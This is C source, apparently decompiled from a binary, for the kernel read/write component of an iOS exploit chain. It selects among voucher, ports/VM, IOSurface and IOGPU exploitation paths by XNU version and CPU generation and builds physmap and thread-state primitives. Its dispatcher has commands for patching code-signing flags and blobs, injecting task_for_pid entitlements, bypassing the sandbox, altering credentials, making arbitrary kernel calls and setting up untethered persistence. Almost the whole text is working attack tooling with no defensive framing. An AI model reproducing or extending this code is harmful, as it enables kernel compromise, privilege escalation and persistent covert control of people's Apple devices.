typedef enum krw_setup_path {
  KRW_SETUP_PATH_VOUCHER = 0,
  KRW_SETUP_PATH_PORTS_VM = 1,
  KRW_SETUP_PATH_IOSURFACE = 2,
  KRW_SETUP_PATH_IOGPU = 3,
} krw_setup_path_t;

typedef struct krw_thread_state_mapping {
  vm_address_t mappedAddress;
  vm_size_t mappedSize;
  pthread_t suspendedThread;
  thread_act_t machThread;
  uint32_t statePageOffset;
} krw_thread_state_mapping_t;

enum
{
  KRW_CTX_SIZE = 0x1D60,
  KRW_CTX_OLD_PTRAUTH_BASE_OFFSET = 0x228,
  KRW_CTX_OLD_SELF_TASK_IPC_OFFSET = 0x230,
  KRW_CTX_NECP_TRIGGER_ADDR_OFFSET = 0x218,
  KRW_CTX_PPL_DATA_CONST_PTR_OFFSET = 0x220,
  KRW_CTX_SHARED_MEM_PORT_OFFSET = 0xE8,
  KRW_CTX_SHARED_MEM_USER_ADDR_OFFSET = 0xF8,
  KRW_CTX_SHARED_MEM_KERN_ADDR_OFFSET = 0x100,
  KRW_CTX_PIPE_READ_FD_OFFSET = 0x1930,
  KRW_CTX_PIPE_WRITE_FD_OFFSET = 0x1934,
  KRW_CTX_IOSURFACE_FD_OFFSET = 0x1940,
  KRW_CTX_NECP_FD_OFFSET = 0x1944,
  KRW_CTX_NECP_UUID_OFFSET = 0x1948,
  KRW_CTX_NECP_PORT_SET_KADDR_OFFSET = 0x1958,
  KRW_CTX_THREAD_STATE_MAPPING_OFFSET = 0x1D50,
  KRW_THREAD_STATE_OFFSET_A12_TO_A17 = 0xB8,
  KRW_THREAD_STATE_OFFSET_PRE_A11 = 0x100,
  KRW_THREAD_STATE_OFFSET_A17 = 0x108,
};

#define KRW_CTX_AT(krwCtx, type, offset) (*(type *)(KRWCTX_RAW_PTR(krwCtx) + (offset)))

enum
{
  PHYSMAP_CTX_SPRAY_PAGES_OFFSET = 0x30,
  PHYSMAP_CTX_SHARED_COPY_BASE_OFFSET = 0x440,
  PHYSMAP_CTX_REGION_A_LIST_OFFSET = 0x468,
  PHYSMAP_CTX_REGION_A_INDEX_OFFSET = 0x478,
  PHYSMAP_CTX_REGION_B_LIST_OFFSET = 0x490,
  PHYSMAP_CTX_REGION_B_INDEX_OFFSET = 0x4A0,
  PHYSMAP_CTX_COPY_THREAD_A_OFFSET = 0x4F8,
  PHYSMAP_CTX_COPY_THREAD_A_READY_OFFSET = 0x500,
  PHYSMAP_CTX_COPY_THREAD_B_OFFSET = 0x508,
  PHYSMAP_CTX_COPY_THREAD_B_READY_OFFSET = 0x510,
  PHYSMAP_CTX_RESTORE_ENTRY_A_OFFSET = 0x4B8,
  PHYSMAP_CTX_RESTORE_ENTRY_B_OFFSET = 0x4D8,
  PHYSMAP_CTX_PAGE_WINDOW_COUNT_OFFSET = 0x598,
  PHYSMAP_CTX_RACE_SOURCE_A_OFFSET = 0x5D8,
  PHYSMAP_CTX_RACE_SOURCE_B_OFFSET = 0x5E0,
  PHYSMAP_PAGE_ENTRY_ALIAS_OFFSET = 0x38,
  PHYSMAP_PAGE_ENTRY_BACKING_OFFSET = 0xA0,
};

#define PHYSMAP_CTX_AT(krwCtx, type, offset) (*(type *)((char *)(krwCtx) + (offset)))

static krw_setup_path_t krw_select_setup_path(struct_krwCtx *krwCtx)
{
  uint64_t xnuVersionPacked = krwCtx->xnuVersionPacked;
  uint32_t flags = krwCtx->flags;
  bool isA12ToA17 = (flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0;

  if ( xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) )
    return (flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 ? KRW_SETUP_PATH_IOGPU : KRW_SETUP_PATH_IOSURFACE;
  if ( xnuVersionPacked > XNU_VERSION_PACKED(8796, 122, 4, 1023, 1023) )
    return KRW_SETUP_PATH_IOSURFACE;
  if ( xnuVersionPacked > XNU_VERSION_PACKED(8796, 102, 4, 1023, 1023) )
    return isA12ToA17 && (flags & KRW_CTX_FLAG_CPU_A12) == 0 ? KRW_SETUP_PATH_PORTS_VM : KRW_SETUP_PATH_IOSURFACE;
  if ( xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023)
    && (isA12ToA17 || xnuVersionPacked > XNU_VERSION_PACKED(8020, 99, 1023, 1023, 1023)) )
  {
    return KRW_SETUP_PATH_PORTS_VM;
  }
  return KRW_SETUP_PATH_VOUCHER;
}

static bool krw_has_any_ready_method(struct_krwCtx *krwCtx)
{
  bool hasThreadStateKrw = krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr;
  bool hasIOConnectKrw = (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2
                      && *(uint64_t *)&krwCtx->ioConnectMappedAddr
                      && *(uint64_t *)&krwCtx->ioConnectMappedSize;
  bool hasPipePairKrw = krwCtx->krw_pipe_0 != -1
                     && krwCtx->krw_pipe_1 != -1
                     && ((krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218)
                      || (krwCtx->pipeFd0 != -1 && krwCtx->pipeFd1 != -1));
  bool hasTargetPortKrw = (unsigned int)(krwCtx->targetVmPort + 1) >= 2;

  return hasThreadStateKrw || hasIOConnectKrw || hasPipePairKrw || hasTargetPortKrw;
}

static bool krw_prepare_selected_setup_path(struct_krwCtx *krwCtx, krw_setup_path_t setupPath, uint32_t *needsSecondStage)
{
  switch ( setupPath )
  {
    case KRW_SETUP_PATH_VOUCHER:
      return krw_setup_with_stat(krwCtx, needsSecondStage);
    case KRW_SETUP_PATH_PORTS_VM:
      return krw_setup_ports_vm(krwCtx, needsSecondStage);
    case KRW_SETUP_PATH_IOGPU:
      return iogpu_krw_ctx_setup(krwCtx, needsSecondStage) == 0;
    case KRW_SETUP_PATH_IOSURFACE:
    default:
      return krw_setup_iosurface_v2(krwCtx, needsSecondStage);
  }
}

static bool krw_finish_selected_setup_path(struct_krwCtx *krwCtx, krw_setup_path_t setupPath)
{
  switch ( setupPath )
  {
    case KRW_SETUP_PATH_VOUCHER:
      return krw_setup_voucher(krwCtx);
    case KRW_SETUP_PATH_PORTS_VM:
      return krw_setup_physmap(krwCtx);
    case KRW_SETUP_PATH_IOGPU:
      return iogpu_physmap_init(krwCtx) == 0;
    case KRW_SETUP_PATH_IOSURFACE:
    default:
      return krw_setup_iosurface(krwCtx);
  }
}

static uint64_t driver_dispatch_finish(uint64_t status, bool commandSucceeded)
{
  if ( (uint32_t)status || commandSucceeded )
    return (uint32_t)status;
  return 163843;
}

char *_CFProcessPath(void);

#define DRIVER_CMD_PATCH_PARENT_CSFLAGS 1
#define DRIVER_CMD_GET_SELF_TASK_PORT_OFFSET 2
#define DRIVER_CMD_INJECT_TFP_ENTITLEMENT 3
#define DRIVER_CMD_PATCH_CSBLOB 6
#define DRIVER_CMD_SET_THREAD_KOBJ_DISPATCH 7
#define DRIVER_CMD_GET_OR_SET_SELF_UID_CRED 8
#define DRIVER_CMD_SET_SELF_SPECIAL_PORT 9
#define DRIVER_CMD_SETUP_SANDBOX_BYPASS 10
#define DRIVER_CMD_CHECK_SELF_DYLD_INFO 11
#define DRIVER_CMD_KREAD_SET_VM_ATTR 12
#define DRIVER_CMD_NECP_SEND_SELF 13
#define DRIVER_CMD_PGTABLE_KREAD_VM_ATTR 15
#define DRIVER_CMD_PGTABLE_KREAD_VM_ATTR_NO_PATCH 19
#define DRIVER_CMD_INJECT_CSBLOB_ENTITLEMENT 20
#define DRIVER_CMD_GET_TASK_PORT_PID_OFFSET 21
#define DRIVER_CMD_NECP_SEND_TASK 22
#define DRIVER_CMD_VALIDATE_IPC_KOBJECT_READ 23
#define DRIVER_CMD_SET_TASK_SPECIAL_PORT 26
#define DRIVER_CMD_PHYSMAP_KREAD_AND_REFRESH 31
#define DRIVER_CMD_INSERT_TASK_SEND_RIGHT 34
#define DRIVER_CMD_KREAD_PROC_ENTITLEMENT_DATA 38
#define DRIVER_CMD_GET_PROC_EXEC_FLAGS ((int)0xC000001Bu)
#define DRIVER_CMD_UNSUPPORTED_1C ((int)0xC000001Cu)
#define DRIVER_CMD_TASK_FOR_PID_OR_NAME_RET_PTR ((int)0xC000001Du)
#define DRIVER_CMD_UNSUPPORTED_1E ((int)0xC000001Eu)
#define DRIVER_CMD_UNSUPPORTED_1F ((int)0xC000001Fu)
#define DRIVER_CMD_UPDATE_PHYSMAP_TABLE_SELF ((int)0x8000001Cu)
#define DRIVER_CMD_UPDATE_PHYSMAP_TABLE_TASK ((int)0xC0000020u)
#define DRIVER_CMD_UNSUPPORTED_21 ((int)0xC0000021u)
#define DRIVER_CMD_UNSUPPORTED_22 ((int)0xC0000022u)
#define DRIVER_CMD_KREAD_VERSION_CHECK ((int)0xC0000023u)
#define DRIVER_CMD_CHECK_TASK_DYLD_INFO_8 ((int)0x40000018u)
#define DRIVER_CMD_CHECK_TASK_DYLD_INFO_32 ((int)0x40000019u)
#define DRIVER_CMD_KREAD_PROC_ENTITLEMENT_FULL ((int)0x4000001Bu)
#define DRIVER_CMD_SET_THREAD_STATE_VERSIONED ((int)0x4000001Eu)
#define DRIVER_CMD_MACH_VM_WIRE ((int)0x40000021u)
#define DRIVER_CMD_KWRITE_VERSION_CHECK ((int)0x40000023u)
#define DRIVER_CMD_STAGE3_GET_MOUNT_POINT 0x302
#define DRIVER_CMD_STAGE3_SETUP_UNTETHERED ((int)0x40000301u)
#define DRIVER_CMD_STAGE3_KCALL_3ARGS ((int)0xC0000303u)
#define DRIVER_CMD_STAGE3_KCALL_1ARG ((int)0x40000304u)
#define DRIVER_CMD_STAGE3_KCALL_6ARGS ((int)0x40000305u)
#define DRIVER_CMD_STAGE3_GET_ROOT_MOUNT_INFO ((int)0x80000306u)
#define DRIVER_CMD_STAGE3_PHYSMAP_CHECK_RANGE ((int)0x40000306u)
#define DRIVER_CMD_STAGE1_GET_ROOT_PREFIX ((int)0x80000108u)
#define DRIVER_CMD_STAGE1_GET_ROOT_STATFS ((int)0x80000109u)
#define DRIVER_CMD_STAGE1_CHECK_KRW_NECP_STATE ((int)0x8000010Du)
#define DRIVER_CMD_STAGE1_CHECK_MOUNT_THREAD 265
#define DRIVER_CMD_STAGE1_WALK_CSBLOB_FOR_PATH 268
#define DRIVER_CMD_STAGE1_CHECK_DISPATCH_KRW 269
#define DRIVER_CMD_STAGE1_PHYSMAP_SINGLE_CHECK ((int)0x40000105u)
#define DRIVER_CMD_STAGE1_NECP_CAPABILITIES ((int)0xC000010Bu)
#define DRIVER_CMD_STAGE1_PHYSMAP_ENTRY_CHECK ((int)0x4000010Au)

static uint64_t driver_dispatch_stage3_command(struct_krwCtx *krwCtx, int cmd, uint64_t inoutValue)
{
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) || krwCtx->xnuMajorVersion > 8791 )
    return 708616;

  if ( cmd > 0x40000300 )
  {
    switch ( cmd )
    {
      case DRIVER_CMD_STAGE3_SETUP_UNTETHERED:
        return driver_cmd_setup_untethered_persistence_maybe(krwCtx, *(uint32_t *)inoutValue);
      case DRIVER_CMD_STAGE3_KCALL_1ARG:
        return krw_dispatch_call_1arg(krwCtx, *(uint32_t *)(inoutValue + 12));
      case DRIVER_CMD_STAGE3_KCALL_6ARGS:
        return krw_dispatch_call_6args(
          krwCtx,
          *(uint32_t *)inoutValue,
          *(uint64_t *)(inoutValue + 8),
          *(uint64_t *)(inoutValue + 16),
          *(uint32_t *)(inoutValue + 24),
          *(uint64_t *)(inoutValue + 32));
      case DRIVER_CMD_STAGE3_PHYSMAP_CHECK_RANGE:
        return physmap_check_range_wrapper(krwCtx, inoutValue, 20);
      default:
        return 708616;
    }
  }

  switch ( cmd )
  {
    case DRIVER_CMD_STAGE3_GET_ROOT_MOUNT_INFO:
      return get_root_mount_info(krwCtx, (uint32_t *)inoutValue, (char *)(inoutValue + 16));
    case DRIVER_CMD_STAGE3_KCALL_3ARGS:
      return krw_dispatch_call_3args(
        krwCtx,
        *(uint64_t *)inoutValue,
        *(uint32_t *)(inoutValue + 8),
        inoutValue + 12);
    case DRIVER_CMD_STAGE3_GET_MOUNT_POINT:
      return get_mount_point_via_dispatch(krwCtx);
    default:
      return 708616;
  }
}

static uint64_t driver_dispatch_stage1_command(struct_krwCtx *krwCtx, int cmd, uint64_t inoutValue)
{
  uint64_t v3; // x20
  uint64_t v6; // x21
  int v14; // w23
  int v15; // w0
  int v16; // w0
  int v21; // w0
  int v22; // w22
  int v23; // w21
  int v24; // w22
  unsigned int v25; // w1
  bool v26; // w8
  int v27; // w20
  int v28; // w8
  __int64 v50; // [xsp+0h] [xbp-40h] BYREF
  int v51; // [xsp+8h] [xbp-38h] BYREF
  int v52; // [xsp+Ch] [xbp-34h] BYREF

  v3 = inoutValue;
  v6 = 708616;
  v14 = 0;
  v50 = 0;
  LODWORD(v50) = v3;
  v52 = 0;
  if ( cmd > 264 )
  {
    if ( cmd > 268 )
    {
      if ( cmd != DRIVER_CMD_STAGE1_CHECK_DISPATCH_KRW )
      {
        if ( cmd == DRIVER_CMD_STAGE1_PHYSMAP_ENTRY_CHECK )
        {
          v15 = physmap_entry_check(krwCtx, *(uint32_t *)v3, *(uint32_t *)(v3 + 4), *(uint64_t *)(v3 + 16));
          goto LABEL_79;
        }
        if ( cmd == DRIVER_CMD_STAGE1_PHYSMAP_SINGLE_CHECK )
        {
          v15 = physmap_single_check(krwCtx, v3, 20);
LABEL_79:
          v14 = v15;
          LODWORD(v6) = 0;
        }
LABEL_179:
        v26 = v14 == 0;
LABEL_180:
        return driver_dispatch_finish(v6, !v26);
      }
      if ( krwCtx->xnuVersionPacked >> 43 >= 0x44B )
      {
        v15 = check_dispatch_krw_state(krwCtx, v3 != 0);
        goto LABEL_79;
      }
LABEL_84:
      v14 = 0;
      goto LABEL_179;
    }
    if ( cmd != DRIVER_CMD_STAGE1_CHECK_MOUNT_THREAD )
    {
      if ( cmd == DRIVER_CMD_STAGE1_WALK_CSBLOB_FOR_PATH )
      {
        if ( !v3 )
          v3 = _CFProcessPath();
        v21 = open((const char *)v3, 0, v50);
        if ( v21 == -1 )
        {
          v27 = errno;
          v14 = 0;
          v28 = errno;
          if ( v27 < 0 )
            v28 = -v28;
          LODWORD(v6) = v28 | 0x40000000;
        }
        else
        {
          v22 = v21;
          if ( v3 )
            LODWORD(v6) = 0;
          else
            LODWORD(v6) = 708609;
          v14 = walk_csblob_chain_for_offset(krwCtx, v21);
          close(v22);
        }
      }
      goto LABEL_179;
    }
    v25 = v3 & 0xF;
    if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
    {
      if ( v25 > 2 )
      {
        v14 = 0;
        LODWORD(v6) = 708609;
        goto LABEL_179;
      }
      v15 = check_mount_thread_info(krwCtx, v25);
      goto LABEL_79;
    }
    if ( v25 == 1 )
      LODWORD(v6) = 708616;
    else
      LODWORD(v6) = 0;
    goto LABEL_178;
  }
  if ( cmd > -2147483380 )
  {
    if ( cmd != DRIVER_CMD_STAGE1_CHECK_KRW_NECP_STATE )
    {
      if ( cmd != DRIVER_CMD_STAGE1_NECP_CAPABILITIES )
        goto LABEL_179;
      v23 = *(uint32_t *)v3;
      v24 = (*(uint32_t *)v3 & 1) != 0 && krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) && krwCtx->xnuMajorVersion < 8792;
      if ( (v23 & 4) != 0 )
      {
        if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
        {
          if ( check_necp_flag(krwCtx) )
            v24 |= 4u;
        }
        else if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11) && krwCtx->xnuMajorVersion > 6152 )
        {
          v24 |= 4u;
        }
      }
      if ( (v23 & 2) != 0 )
      {
        if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
        {
          if ( check_necp_flag(krwCtx) )
            v24 |= 2u;
        }
        else
        {
          v24 |= 2u;
        }
      }
      if ( (v23 & 8) != 0 && krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
        v24 |= 8u;
      LODWORD(v6) = 0;
      *(uint32_t *)v3 = v24;
      goto LABEL_178;
    }
    v16 = 0;
    LOBYTE(v51) = 0;
    if ( krwCtx->xnuVersionPacked >> 43 >= 0x44B )
    {
      v16 = check_krw_necp_state(krwCtx, (bool *)&v51);
      LODWORD(v6) = 0;
      if ( v16 )
        LODWORD(v50) = (unsigned __int8)v51;
    }
  }
  else
  {
    if ( cmd == DRIVER_CMD_STAGE1_GET_ROOT_PREFIX )
    {
      v51 = 1024;
      if ( !(unsigned int)get_root_prefix_path(krwCtx, (void *)(v3 + 16), (uint32_t *)&v51, (int *)&v52) )
      {
        LODWORD(v6) = 0;
        goto LABEL_84;
      }
      if ( v52 )
        *(uint32_t *)v3 = 1;
      LODWORD(v6) = 0;
      if ( v51 )
        *(uint32_t *)v3 |= 2u;
LABEL_178:
      v14 = 1;
      goto LABEL_179;
    }
    if ( cmd != DRIVER_CMD_STAGE1_GET_ROOT_STATFS )
      goto LABEL_179;
  v16 = get_root_statfs(krwCtx, (int *)&v50);
    LODWORD(v6) = 0;
  }
  if ( v16 )
  {
    v26 = 0;
    *(uint32_t *)v3 = v50;
  }
  else
  {
    v26 = 1;
  }
  goto LABEL_180;
}

